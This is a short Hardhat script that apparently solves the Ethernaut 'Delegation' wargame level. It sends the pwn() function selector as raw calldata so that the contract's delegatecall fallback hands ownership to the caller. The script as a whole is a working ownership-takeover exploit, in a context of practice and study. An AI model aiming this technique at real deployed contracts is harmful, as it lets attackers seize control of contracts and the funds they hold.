const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Delegation = await ethers.getContractFactory("Delegation");

    let delegation = Delegation.attach(instance_address);

    console.log(`Current owner: ${await delegation.owner()}`);

    // Get the function signature for the pwn function
    let ABI = ['function pwn()'];
    let iface = new ethers.utils.Interface(ABI);
    let sig = iface.getSighash("pwn()");
    console.log(`pwn() signature: ${sig}`);

    // Call pwn() on the delegation instance
    console.log('Calling pwn() on the delegation instance');
    let tx = await account.sendTransaction({
        to:       instance_address,
        data:     sig,
        gasLimit: 150000
    });

    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`New owner: ${await delegation.owner()}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xD35BA9474407d6B13d7d797292DC205772E6f7B8';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
